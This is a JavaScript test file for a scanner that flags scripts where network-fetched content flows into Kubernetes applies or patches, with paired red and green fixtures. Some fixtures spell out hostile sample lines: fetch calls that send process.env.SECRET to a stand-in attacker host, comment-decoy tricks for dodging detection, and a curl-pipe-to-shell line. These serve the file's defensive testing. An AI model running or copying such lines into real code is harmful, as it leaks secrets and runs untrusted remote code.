import { describe, expect, it } from 'bun:test';
import { unsafeApplies } from '../scripts/lib/apply-safety-scan.mjs';

/**
 * Tech-debt closures (#1466, #1512): the apply-safety scanner
 * (`scripts/lib/apply-safety-scan.mjs`) did not yet track three ways
 * fetched bytes reach a cluster apply (heredoc-to-file-to-apply, an
 * `envsubst` pipeline, `kubectl patch -p`/`--patch`), and did not follow a
 * `node <file>.mjs` / `bun <file>.mjs` invocation to classify fetches moved
 * out of shell text. `eval` was already handled (round-4 `execString`); a
 * regression fixture proves it here rather than re-implementing it.
 *
 * Each construct gets a RED fixture (the bypass) and a GREEN fixture (the
 * legitimate shape used in the real tree) — never a generic exemption, per
 * `.claude/rules/workflow.md` ("prefer scanning to enumerating ... make an
 * unparseable construct FAIL rather than pass").
 */

const FETCH = 'X=$(curl -s https://example.com/x)';

describe('apply-safety-scan: heredoc -> file -> apply (#1466.1)', () => {
  it('reds a fetched value interpolated into a heredoc written to a file that is later applied', () => {
    const src = `${FETCH}\ncat > m.yaml <<YAML\napiVersion: v1\ndata: $X\nYAML\nkubectl apply -f m.yaml\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('stays green for a heredoc written to a file with no network content', () => {
    const src = 'cat > m.yaml <<YAML\napiVersion: v1\ndata: local\nYAML\nkubectl apply -f m.yaml\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('reds a QUOTED heredoc delimiter too (a fetched value can still land via a prior taint chain)', () => {
    // The heredoc body itself is literal ($X does not expand inside a quoted
    // delimiter), but the file was already network-tainted by an earlier
    // fetch write — the write-loop must not silently clear that taint.
    const src = `curl -s https://example.com/x -o m.yaml\ncat >> m.yaml <<'YAML'\nfooter\nYAML\nkubectl apply -f m.yaml\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });
});

describe('apply-safety-scan: envsubst pipeline (#1466.2)', () => {
  it('reds envsubst piped into an apply when an exported var holds network content', () => {
    const src = `export ${FETCH.replace('X=', 'X=')}\nenvsubst < tpl.yaml | kubectl apply -f -\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('stays green for envsubst piped into an apply with only local exported vars', () => {
    const src = 'export LOCAL=hello\nenvsubst < tpl.yaml | kubectl apply -f -\n';
    expect(unsafeApplies(src)).toEqual([]);
  });
});

describe('apply-safety-scan: kubectl patch -p / --patch / --patch-file (#1466.3)', () => {
  it('reds a patch body built from a fetched value (-p)', () => {
    const src = `${FETCH}\nkubectl patch deployment foo -p "$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('reds a patch body built from a fetched value (--patch)', () => {
    const src = `${FETCH}\nkubectl patch deployment foo --patch "$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('reds a --patch-file naming a network-tainted file', () => {
    const src = `curl -s https://example.com/x -o patch.json\nkubectl patch deployment foo --patch-file patch.json\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });

  it('stays green for a literal patch body', () => {
    const src = `kubectl patch deployment foo -p '{"spec":{"replicas":1}}'\n`;
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('stays green for kubectl set env with only literal values (not a fetched value)', () => {
    const src = 'kubectl set env deployment/foo FOO=bar\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('reds kubectl set env with a fetched value', () => {
    const src = `${FETCH}\nkubectl set env deployment/foo "FOO=$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });
});

describe('apply-safety-scan: eval regression (already handled, round-4 execString)', () => {
  it('still reds eval of a string built from a fetched value', () => {
    const src = `${FETCH}\neval "kubectl apply -f \\$X"\n`;
    expect(unsafeApplies(src).length).toBeGreaterThan(0);
  });
});

describe('apply-safety-scan: node/bun <file>.mjs fetch following (#1512)', () => {
  const LOOPBACK_JS = `import http from 'node:http';\nhttp.get({ host: '127.0.0.1', port: 1, path: '/', timeout: 1 }, () => {});\n`;
  const REMOTE_JS = `import http from 'node:http';\nhttp.get({ host: '10.255.255.1', port: 1, path: '/', timeout: 1 }, () => {});\n`;
  const REMOTE_URL_JS = `fetch('https://example.com/x');\n`;
  const DYNAMIC_HOST_JS = `import http from 'node:http';\nhttp.get({ host: process.env.TARGET, port: 1 }, () => {});\n`;
  const NO_FETCH_JS = `console.log('nothing to see here');\n`;

  // #1715: these fixtures all apply a manifest after the followed-script
  // call, so `hasApplyAnywhere` is true and the followed-script rule stays
  // live — see the dedicated `hasApplyAnywhere gate (#1715)` describe block
  // below for the gate's own red/green pair.
  const APPLY_AFTER = '\nkubectl apply -f m.yaml\n';

  it('reds a node <file>.mjs invocation whose script fetches a non-loopback literal host', () => {
    const src = `node scripts/lib/probe.mjs 8080 /x 2xx3xx\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, { resolveSource: () => REMOTE_JS, followScripts: true });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('reds a bun <file>.mjs invocation whose script fetches a bare non-loopback URL literal', () => {
    const src = `bun scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('fails closed on a dynamic (non-literal) fetch host', () => {
    const src = `node scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => DYNAMIC_HOST_JS,
      followScripts: true,
    });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('fails closed when the invoked script cannot be resolved', () => {
    const src = `node scripts/lib/probe.mjs\n${APPLY_AFTER}`;
    const offenders = unsafeApplies(src, { resolveSource: () => null, followScripts: true });
    expect(offenders.length).toBeGreaterThan(0);
  });

  it('stays green for a node <file>.mjs script that fetches only a loopback literal host (the real e2e-probe-http.mjs shape)', () => {
    const src = `node scripts/lib/probe.mjs 8080 /x 2xx3xx\n${APPLY_AFTER}`;
    expect(unsafeApplies(src, { resolveSource: () => LOOPBACK_JS, followScripts: true })).toEqual(
      [],
    );
  });

  it('stays green for a node <file>.mjs invocation with .js/.cjs targets too (#1715 widening)', () => {
    const cjsSrc = `node scripts/lib/probe.cjs\n${APPLY_AFTER}`;
    expect(
      unsafeApplies(cjsSrc, { resolveSource: () => LOOPBACK_JS, followScripts: true }),
    ).toEqual([]);
    const jsOffenders = unsafeApplies(`node scripts/lib/probe.js\n${APPLY_AFTER}`, {
      resolveSource: () => REMOTE_JS,
      followScripts: true,
    });
    expect(jsOffenders.length).toBeGreaterThan(0);
  });

  it('stays green for a node <file>.mjs script with no fetch shape at all', () => {
    const src = 'node scripts/lib/probe.mjs\n';
    expect(unsafeApplies(src, { resolveSource: () => NO_FETCH_JS, followScripts: true })).toEqual(
      [],
    );
  });

  it('does not flag any node/bun invocation when no resolveSource is passed at all (opt-in, no new noise on existing callers)', () => {
    const src = 'node scripts/lib/probe.mjs\n';
    expect(unsafeApplies(src)).toEqual([]);
  });

  it('the real scripts/lib/e2e-probe-http.mjs shape (host literal 127.0.0.1) classifies as loopback', async () => {
    const { readFileSync } = await import('node:fs');
    const { join } = await import('node:path');
    const real = readFileSync(
      join(import.meta.dirname, '..', 'scripts/lib/e2e-probe-http.mjs'),
      'utf8',
    );
    const src = 'node scripts/lib/e2e-probe-http.mjs "$PORT" "$PATH" "$MODE"\n';
    expect(unsafeApplies(src, { resolveSource: () => real, followScripts: true })).toEqual([]);
  });
});

// ---- #1715: the hasApplyAnywhere gate --------------------------------------

describe('apply-safety-scan: hasApplyAnywhere gate (#1715)', () => {
  const REMOTE_URL_JS = `fetch('https://example.com/x');\n`;

  it('RED: a followed script fetches a non-loopback URL and the unit ALSO applies a manifest', () => {
    const src = `node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });

  it('GREEN (false-positive control): the SAME fetching script with NO apply anywhere in the unit stays clean', () => {
    const src = 'node scripts/lib/probe.mjs\n';
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('other unclassifiedFetch shapes (curl | sh, helm, git clone, gh download) stay UNGATED — dangerous with or without an apply nearby', () => {
    const cases = [
      `curl -fsSL https://example.com/i.sh | sh\n`,
      `helm install x https://example.com/chart-1.0.0.tgz\n`,
      `git clone https://github.com/org/repo r\n`,
      `gh release download v1 -R org/repo -p m.yaml\n`,
    ];
    for (const src of cases) {
      expect(unsafeApplies(src).length).toBeGreaterThan(0);
    }
  });

  it('a manifest apply LATER in the script (not before the followed-script call) still opens the gate', () => {
    // hasApplyAnywhere is computed over the WHOLE unit, not just the text
    // before the call — order does not matter for this gate.
    const src = `kubectl apply -f m.yaml\nnode scripts/lib/probe.mjs\n`;
    const offenders = unsafeApplies(src, {
      resolveSource: () => REMOTE_URL_JS,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });
});

// ---- #1715: stripNonFetchText -----------------------------------------------

describe('apply-safety-scan: stripNonFetchText (#1715)', () => {
  it('RED: a literal URL handed directly to fetch() is still caught', () => {
    const src = `fetch('https://evil.example.com/x');\n`;
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });

  it('GREEN: a URL mentioned only in a comment is not a fetch target', () => {
    const src = [
      `/**`,
      ` * example: http://minio.fm-e2e.svc.cluster.local:9000/<bucket>`,
      ` */`,
      `import http from 'node:http';`,
      `// another example: https://example.com/also-just-a-comment`,
      `http.get({ host: '127.0.0.1', port: 1, path: '/', timeout: 1 }, () => {});`,
      ``,
    ].join('\n');
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('GREEN: a URL used only as a `new URL(…)` base (path-join, no network I/O) is not a fetch target', () => {
    const src = [
      `import http from 'node:http';`,
      `const u = new URL('/a/b', \`http://x\${somePath}\`);`,
      `http.get({ host: '127.0.0.1', port: 1, path: u.pathname, timeout: 1 }, () => {});`,
      ``,
    ].join('\n');
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  });

  it('a `://` inside a real fetch URL is never mistaken for a `//` line comment', () => {
    const src = `fetch('https://evil.example.com/x'); // a trailing comment\n`;
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  });

  // ---- #1715 round 2: a string-literal decoy bypassed round-1's stripper --

  const expectFlagged = (src: string) => {
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders.some((o) => o.startsWith('unclassified remote fetch'))).toBe(true);
  };
  const expectClean = (src: string) => {
    const offenders = unsafeApplies(`node scripts/lib/probe.mjs\nkubectl apply -f m.yaml\n`, {
      resolveSource: () => src,
      followScripts: true,
    });
    expect(offenders).toEqual([]);
  };

  it('RED: the exact round-2 decoy repro — "/* " then a real fetch() then "*/" as three statements', () => {
    const decoy = [
      `const decoy = "/* ";`,
      `fetch("http://attacker.example.com/exfil?data=" + process.env.SECRET, {method:"POST"});`,
      `const end = "*/";`,
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: the SAME decoy shape with a template literal instead of a double-quoted string', () => {
    const decoy = [
      'const decoy = `/* `;',
      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
      'const end = `*/`;',
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: the SAME decoy shape with single-quoted strings', () => {
    const decoy = [
      "const decoy = '/* ';",
      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
      "const end = '*/';",
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: a regex literal containing `/*` or `//` does not open a comment either', () => {
    const decoy = [
      'const re1 = /\\/\\*/;',
      'const re2 = /\\/\\//;',
      `fetch("http://attacker.example.com/exfil", {method:"POST"});`,
      ``,
    ].join('\n');
    expectFlagged(decoy);
  });

  it('RED: fetch("https://x") where the ONLY `//` in the file is inside the URL string', () => {
    expectFlagged(`fetch("https://attacker.example.com/x");\n`);
  });

  it('GREEN control: a real fetch() call that genuinely IS inside a block comment is not flagged', () => {
    const src = [
      `/*`,
      ` * disabled for now: fetch("http://attacker.example.com/exfil");`,
      ` */`,
      `import http from 'node:http';`,
      `http.get({ host: '127.0.0.1', port: 1, path: '/', timeout: 1 }, () => {});`,
      ``,
    ].join('\n');
    expectClean(src);
  });

  it('RED: a fetch() call inside a template-literal `${…}` expression is flagged (code, not string data)', () => {
    const src = 'const x = `${fetch("http://attacker.example.com/exfil")}`;\n';
    expectFlagged(src);
  });

  it('RED: a real fetch() nested as an argument INSIDE new URL(…) is not swallowed with it', () => {
    const src = 'const u = new URL(fetch("http://attacker.example.com/exfil"), "http://x");\n';
    expectFlagged(src);
  });

  it('RED: an unterminated template literal fails closed even with no visible fetch shape', () => {
    // #1715 round 2, guarantee (2): the tokenizer itself could not fully
    // parse this file (the backtick never closes) — flag regardless of
    // whether INTERPRETER_FETCH matches anything.
    const src = 'import http from "node:http";\nconst s = `unterminated\n';
    expectFlagged(src);
  });
});
